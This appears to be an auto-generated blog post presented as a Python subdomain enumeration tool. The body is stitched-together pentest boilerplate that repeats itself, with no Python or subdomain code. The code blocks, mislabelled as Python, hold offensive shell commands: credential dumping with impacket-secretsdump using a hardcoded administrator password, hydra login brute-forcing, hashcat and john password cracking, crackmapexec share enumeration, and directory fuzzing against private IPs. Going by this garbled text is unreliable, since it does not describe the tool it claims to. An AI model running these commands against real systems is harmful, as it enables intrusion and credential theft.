---
TitleSEO: "Subdomain Enumeration Tool in Python | ZureFX"
TitlePost: "Subdomain Enumeration Tool — Python"
Author: "ZureFX"
Description: "A Python script for subdomain enumeration tool. Built for security research and automation."
Keywords: "go, script, automation, scanner, parser, fuzzer, python"
URL: "https://zurefx.github.io/scripting/script-subdomain-enumeration-tool-406.html"
URL_IMAGES: ""
Date: "2025-10-29"
Tags: "Go, Script, Automation, Scanner, Parser, Fuzzer, Python"
Section: "scripting"
Lang: "en"
main_img: "script-subdomain-enumeration-tool-406"
Permalink: "/scripting/script-subdomain-enumeration-tool-406.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `socat`
- `wmiexec`
- `impacket`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.77.226/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.124.37
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.69.166.188 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.56.38.172/FUZZ
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
gobuster dir -u http://10.98.146.176/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.11.160.154 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.173.219 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 19.20s
```
